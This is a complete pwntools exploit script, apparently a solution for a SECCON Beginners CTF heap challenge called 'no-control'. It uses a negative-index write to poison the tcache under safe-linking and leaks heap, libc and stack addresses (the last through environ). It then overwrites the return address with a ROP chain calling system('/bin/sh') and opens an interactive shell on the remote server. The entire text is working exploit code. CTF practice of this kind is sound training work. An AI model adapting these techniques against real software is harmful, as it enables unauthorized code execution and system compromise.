
from pwn import *
import sys

elf = ELF("chall")
libc = ELF("libc.so.6")

#io = process(elf.path, timeout=3)
io = remote("no-control.beginners.seccon.games", 9005)

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
#gdb.attach(io, gdb_args = ["-ex", "init-pwndbg"], gdbscript = ''' b *update_memo''')

def choice(c):
    io.sendlineafter(b'> ', c)

def ask_idx(idx):
    io.sendlineafter(b'index: ', idx)

def create(idx):
    choice(b'1')
    ask_idx(idx)

def show(idx):
    choice(b'2')
    ask_idx(idx)
    tail = b'\n1. create'
    r = io.recvuntil(tail)
    return r[:-len(tail)]

def update(idx, ctx):
    choice(b'3')
    ask_idx(idx)
    io.sendafter(b'content:', ctx)

def delete(idx):
    choice(b'4')
    ask_idx(idx)
   

create(b'0')
delete(b'0')
create(b'0')
leak = show(b'0')
heap_addr = u64(leak.ljust(8, b'\x00')) << 12
log.info(f'heap addr: {hex(heap_addr)}')

main_arena_oft = 0x219ce0
def safe_link(addr):
    return addr ^(heap_addr >> 12)

# libc leak
create(b'1')
create(b'2')
create(b'3')
create(b'4')
delete(b'0')
delete(b'1')
update(b'-1', p64(safe_link(heap_addr + 0x10)))
create(b'0')
create(b'1')
update(b'-1', p64(0) + p64(8<<48))
delete(b'0')
show(b'1')
update(b'-1', p64(0) + p64(0))
delete(b'3')
delete(b'4')
update(b'-1', p64(safe_link(heap_addr + 0xc0)))
create(b'3')
create(b'4')
update(b'-1', p64(0) + p64(heap_addr + 0x330))
show(b'1')
update(b'-1', p64(0) + p64(8<<48))
create(b'0')
leak = show(b'0')
libc.address = u64(leak.ljust(8, b'\x00')) - main_arena_oft
log.info(f'libc addr: {hex(libc.address)}')

# stack leak
show(b'1')
update(b'-1', p64(0) + p64(8 << 48))
show(b'4')
update(b'-1', p64(0) + p64(libc.sym["environ"]))
create(b'0')
leak = show(b'0')
return_addr = u64(leak.ljust(8, b'\x00')) - 0x120
log.info(f'return addr: {hex(return_addr)}')

# create ROP
show(b'1')
update(b'-1', p64(0) + p64(8 << 48))
show(b'4')
update(b'-1', p64(0) + p64(return_addr - 0x8))
create(b'0')

p = p64(next(libc.search(asm('pop rdi ; ret'), executable=True)))
p += p64(next(libc.search(b'/bin/sh\x00')))
p += p64(next(libc.search(asm('ret'), executable=True)))
p += p64(libc.sym["system"])

update(b'0', p64(0) + p)

choice(b'5')


io.interactive()
